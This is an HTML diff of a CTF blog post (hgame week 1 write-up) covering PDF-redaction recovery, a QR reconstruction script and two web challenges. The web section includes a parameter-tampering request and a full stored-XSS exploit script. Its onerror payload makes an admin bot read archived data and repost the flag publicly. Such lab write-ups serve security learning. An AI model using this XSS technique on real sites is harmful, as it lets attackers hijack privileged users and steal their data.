punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span>
+    b16 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span>
+    b12 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span>
+    b24 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span>
+    b25 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span>
+    apply_block<span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> b2<span class="token punctuation">)</span>
+    apply_block<span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> b6<span class="token punctuation">)</span>
+    apply_block<span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> b7<span class="token punctuation">)</span>
+    apply_block<span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> b8<span class="token punctuation">)</span>
+    apply_block<span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> b9<span class="token punctuation">)</span>
+    apply_block<span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> b10<span class="token punctuation">)</span>
+    apply_block<span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> b11<span class="token punctuation">)</span>
+    apply_block<span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> b13<span class="token punctuation">)</span>
+    apply_block<span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> b14<span class="token punctuation">)</span>
+    apply_block<span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> b12<span class="token punctuation">)</span>
+    apply_block<span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> b18<span class="token punctuation">)</span>
+    apply_block<span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> b19<span class="token punctuation">)</span>
+    apply_block<span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> b15<span class="token punctuation">)</span>
+    apply_block<span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> b20<span class="token punctuation">)</span>
+    apply_block<span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> b21<span class="token punctuation">)</span>
+    apply_block<span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> b16<span class="token punctuation">)</span>
+    apply_block<span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> b24<span class="token punctuation">)</span>
+    apply_block<span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> b25<span class="token punctuation">)</span>
+    out <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"qr_recon.png"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    save_png<span class="token punctuation">(</span>m<span class="token punctuation">,</span> out<span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>得到flag。</p>
+
+      
     </div>
-    
 
     
+    
+    
 
-    <!-- 所有文章卡片 -->
-    <article id="articles" class="container articles">
-        <div class="row article-row">
-            
-             <!-- 隐藏某个文章 -->
-            <div class="article col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/2026/02/27/DODOR%E7%9A%84hgame%E5%A4%8D%E7%8E%B0%E4%B8%8E%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/">
-                        <div class="card-image">
-                            
-                            
-                            <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="DODOR的hgame复现与知识点总结">
-                            
-                            <span class="card-title">DODOR的hgame复现与知识点总结</span>
-                        </div>
-                    </a>
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
 
-                    <div class="card-content article-content">
-                        <div class="summary block-with-text">
-                            
-                                看过wp后的复现wwwww,留档做个记录。
-打好基础之前一直不知道Base100就是将每个字节（8位，值域0-255）映射到一个特定的表情符号。编码表通常包含256个不同的表情符号，每个符号对应一个唯一的字节值。编码过程直接将字节流转换为表
-                            
-                        </div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2026-02-27
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-bookmark fa-fw icon-category"></i>
-                                
-                                <a href="/categories/%E7%9F%A5%E8%AF%86/" class="post-category">
-                                    知识
-                                </a>
-                                
-                                
-                            </span>
-                        </div>
-                    </div>
 
-                    
-                    <div class="card-action article-tags">
-                        
-                        <a href="/tags/CTF/">
-                            <span class="chip bg-color">CTF</span>
-                        </a>
-                        
-                        <a href="/tags/Misc/">
-                            <span class="chip bg-color">Misc</span>
-                        </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-              <!-- 隐藏某个文章 -->
-            
-             <!-- 隐藏某个文章 -->
-            <div class="article col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/2026/02/21/DODOR-000a01-WEEK2-WP/">
-                        <div class="card-image">
-                            
-                            
-                            <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="DODOR#000a01-WEEK2-WP">
-                            
-                            <span class="card-title">DODOR#000a01-WEEK2-WP</span>
-                        </div>
-                    </a>
 
-                    <div class="card-content article-content">
-                        <div class="summary block-with-text">
-                            
-                                Misc:Invest on Matrix解锁hint1就知道是一个version2的二维码，剩下的就是不断解锁补全直到可以通过纠错识别出来，这是基础结构，我们优先补全右下角再逐渐保持中心完整，最后脚本如下：
 
-from PIL impor
-                            
-                        </div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2026-02-21
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-user fa-fw"></i>
-                                DODOR
-                                
-                            </span>
-                        </div>
-                    </div>
+    
 
-                    
-                    <div class="card-action article-tags">
-                        
-                        <a href="/tags/CTF/">
-                            <span class="chip bg-color">CTF</span>
-                        </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-              <!-- 隐藏某个文章 -->
-            
-             <!-- 隐藏某个文章 -->
-            <div class="article col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/2026/02/09/DODOR-000a01-WEEK1-WP/">
-                        <div class="card-image">
-                            
-                            
-                            <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="DODOR#000a01-WEEK1-WP">
-                            
-                            <span class="card-title">DODOR#000a01-WEEK1-WP</span>
-                        </div>
-                    </a>
 
-                    <div class="card-content article-content">
-                        <div class="summary block-with-text">
-                            
-                                misc:[REDACTED]题目为（涂黑，修改）过后的一个pdf，我们可以在第一个涂黑位置找到第一段敏感字符串，直接通过文字编辑功能将颜色改为白色再复制出来得到第一个字符串1:PAR4D0X。(
-然后在第二个涂黑的位置在文字编辑的模式下可
-                            
-                        </div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2026-02-09
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-user fa-fw"></i>
-                                DODOR
-                                
-                            </span>
-                        </div>
-                    </div>
+<div class="post-block">
+  
+  
 
-                    
-                    <div class="card-action article-tags">
-                        
-                        <a href="/tags/CTF/">
-                            <span class="chip bg-color">CTF</span>
-                        </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-              <!-- 隐藏某个文章 -->
-            
-             <!-- 隐藏某个文章 -->
-            <div class="article col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/2025/12/20/DODOR-blog/">
-                        <div class="card-image">
-                            
-                            
-                            <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="DODOR-blog">
-                            
-                            <span class="card-title">DODOR-blog</span>
-                        </div>
-                    </a>
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://dodor-ddd.github.io/2026/02/09/DODOR-000a01-WEEK1-WP/">
 
-                    <div class="card-content article-content">
-                        <div class="summary block-with-text">
-                            
-                                hello,this is my first blog.In my blog ,I’ll share sth interesting and public my wp.Thanks for reading.
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/medias/qingxu.jpg">
+      <meta itemprop="name" content="DODOR">
+    </span>
 
-                            
-                        </div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2025-12-20
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-bookmark fa-fw icon-category"></i>
-                                
-                                <a href="/categories/%E6%9D%82%E8%B0%88/" class="post-category">
-                                    杂谈
-                                </a>
-                                
-                                
-                            </span>
-                        </div>
-                    </div>
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="DODOR's BLOG">
+      <meta itemprop="description" content="">
+    </span>
 
-                    
-                    <div class="card-action article-tags">
-                        
-                        <a href="/tags/%E6%9D%82%E8%B0%88/">
-                            <span class="chip bg-color">杂谈</span>
-                        </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-              <!-- 隐藏某个文章 -->
-            
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | DODOR's BLOG">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/02/09/DODOR-000a01-WEEK1-WP/" class="post-title-link" itemprop="url">DODOR#000a01-WEEK1-WP</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-02-09 21:38:58" itemprop="dateCreated datePublished" datetime="2026-02-09T21:38:58+08:00">2026-02-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-04-22 16:03:38" itemprop="dateModified" datetime="2026-04-22T16:03:38+08:00">2026-04-22</time>
+    </span>
+
+  
+</div>
+
         </div>
-    </article>
-
-</main>
-
-
-
-
-    <footer class="page-footer bg-color">
-    
-        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
-<style>
-    .aplayer .aplayer-lrc p {
-        
-        display: none;
-        
-        font-size: 12px;
-        font-weight: 700;
-        line-height: 16px !important;
-    }
-
-    .aplayer .aplayer-lrc p.aplayer-lrc-current {
-        
-        display: none;
-        
-        font-size: 15px;
-        color: #42b983;
-    }
+      </header>
 
     
-</style>
-<div class="">
     
-    <div class="row">
-        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
-                   server="netease"
-                   type="playlist"
-                   id="17506881908"
-                   fixed='true'
-                   autoplay='false'
-                   theme='#42b983'
-                   loop='all'
-                   order='random'
-                   preload='auto'
-                   volume='0.7'
-                   list-folded='true'
-        >
-        </meting-js>
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="misc"><a href="#misc" class="headerlink" title="misc:"></a>misc:</h2><h3 id="REDACTED"><a href="#REDACTED" class="headerlink" title="[REDACTED]"></a>[REDACTED]</h3><p>题目为（涂黑，修改）过后的一个pdf，我们可以在第一个涂黑位置找到第一段敏感字符串，直接通过文字编辑功能将颜色改为白色再复制出来得到第一个字符串<strong>1:PAR4D0X</strong>。(<img src="https://raw.githubusercontent.com/DODOR-ddd/Image/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-08%20203633.png" alt="屏幕截图 2026-02-08 203633"></p>
+<p>然后在第二个涂黑的位置在文字编辑的模式下可以看到以下内容<img src="https://raw.githubusercontent.com/DODOR-ddd/Image/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-03%20165813.png"></p>
+<p>因为字体原因无法直接复制，选着直接图像识别。三段经典JWT，第一段是加密方式，第二段为内容，第三段为签名，经过base64解码得出第二个字符串<strong>2:AllCl3arToPr0ceed</strong></p>
+<p><img src="https://raw.githubusercontent.com/DODOR-ddd/Image/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-03%20170152.png"></p>
+<p>随后在图片位置有处涂黑，拉对比度和亮度识别出第三个字符串<strong>3:Sh4m1R</strong></p>
+<p><img src="https://raw.githubusercontent.com/DODOR-ddd/Image/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-03%20170751.png"></p>
+<p>最后在检查pdf的文件结构时发现其尾部有2个%EOF为结尾，可知为pdf的增量更新，第四个字符藏在旧版本被删掉的那一页里。</p>
+<p><img src="https://raw.githubusercontent.com/DODOR-ddd/Image/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-05%20171658.png"></p>
+<p>我们现在要做的就是将那删掉的一页恢复，也就是定位到第一个%EOF的位置对pdf进行切片，通过grep找到%EOF的位置。<img src="https://raw.githubusercontent.com/DODOR-ddd/Image/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-05%20200000.png"></p>
+<p><img src="https://raw.githubusercontent.com/DODOR-ddd/Image/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-08%20205415.png"></p>
+<p>计算%EOF的代码如下</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"manual.pdf"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f_in<span class="token punctuation">:</span>
+    <span class="token builtin">file</span> <span class="token operator">=</span> f_in<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"manual_old.pdf"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f_out<span class="token punctuation">:</span>
+    f_out<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">234721</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>打开manual_old.pdf</p>
+<p><img src="https://raw.githubusercontent.com/DODOR-ddd/Image/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-05%20180535.png"></p>
+<p>找到第四段字符串<strong>4:D0cR3qu3st3r_Tutu</strong>,最后连接得到flag。</p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="魔理沙的魔法目录"><a href="#魔理沙的魔法目录" class="headerlink" title="魔理沙的魔法目录"></a>魔理沙的魔法目录</h3><p><img src="/../imgs/$%7Bfiilename%7D/image-20260208210404239.png" alt="image-20260208210404239"></p>
+<p>用F12及网络保存日志可知，每过一定时长，服务器会发送一个record和一个check的请求，record请求荷载为{“time”:10}，而题目对身份没有做限制，可以直接对&#x2F;record用post的application&#x2F;json传参{“time”:7200}(大于1小时)</p>
+<p>![](..&#x2F;imgs&#x2F;${fiilename}&#x2F;屏幕截图 2026-02-02 112832.png)</p>
+<p><img src="https://raw.githubusercontent.com/DODOR-ddd/Image/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-02%20112818.png"></p>
+<p>最终访问&#x2F;check得到flag为：</p>
+<p><img src="https://raw.githubusercontent.com/DODOR-ddd/Image/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-02%20112849.png"></p>
+<h3 id="博丽神社的绘马挂"><a href="#博丽神社的绘马挂" class="headerlink" title="博丽神社的绘马挂"></a><strong>博丽神社的绘马挂</strong></h3><p>题目说明紫在归档完毕的绘马里藏了一些不可告人的秘密。分析前端代码及main.js。发现，题目没有对消息提交界面的content做过滤处理<img src="https://raw.githubusercontent.com/DODOR-ddd/Image/main/image-20260208211730847.png" alt="image-20260208211730847"></p>
+<p>同时有&#x2F;api&#x2F;report可以让Reimu访问。由此得到本体为存储型XSS，但是普通用户看不到已归档的内容，所以接下来的思路就是通过XSS漏洞让管理员在已归档的文档中找到flag，并通过&#x2F;api&#x2F;message发出来，这样普通用户就能看到了。按照以上思路构造payload，写脚本如下：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re
+<span class="token keyword">import</span> time
+<span class="token keyword">import</span> string
+<span class="token keyword">import</span> requests
+site <span class="token operator">=</span> <span class="token string">"http://local-2.hgame.vidar.club:31464"</span>
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    user <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"admin"</span></span>
+    pw <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"123456"</span></span>
+    r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>site<span class="token punctuation">&#125;</span></span><span class="token string">/api/auth/login"</span></span><span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> user<span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> pw<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+    js <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
+(async()=>&#123;
+  try&#123;
+    const a = await fetch('/api/archives').then(r=>r.json());
+    const m = JSON.stringify(a).match(/Hgame\&#123;[^&#125;]+\&#125;/);
+    if(m)&#123;
+      await fetch('/api/messages', &#123;
+        method: 'POST',
+        headers: &#123;'Content-Type':'application/json'&#125;,
+        body: JSON.stringify(&#123;content: m, is_private: false&#125;)
+      &#125;);
+    &#125;
+  &#125;catch(e)&#123;&#125;
+&#125;)();
+"""</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token comment">#让Reimu访问归档页面获取flag再返回到提交message</span>
+
+    payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"&lt;img src=x onerror=\"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>js<span class="token punctuation">&#125;</span></span><span class="token string">\">"</span></span>
+
+    r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>site<span class="token punctuation">&#125;</span></span><span class="token string">/api/messages"</span></span><span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"content"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"is_private"</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>
+        <span class="token keyword">raise</span> SystemExit<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"post failed: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">&#125;</span></span><span class="token string"> </span><span class="token interpolation"><span class="token punctuation">&#123;</span>r<span class="token punctuation">.</span>text<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+    
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>site<span class="token punctuation">&#125;</span></span><span class="token string">/api/report"</span></span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
+            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>site<span class="token punctuation">&#125;</span></span><span class="token string">/api/messages"</span></span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
+            m <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"Hgame\&#123;[^&#125;]+\&#125;"</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> m<span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                <span class="token keyword">return</span>
+        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">raise</span> SystemExit<span class="token punctuation">(</span><span class="token string">"fail"</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里用的上传漏洞是故意导致错误，让管理员自动执行onerror后的命令。</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img src<span class="token operator">=</span>x onerror<span class="token operator">=</span><span class="token string">"payload"</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>最后得到flag<img src="https://raw.githubusercontent.com/DODOR-ddd/Image/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-06%20115538.png"></p>
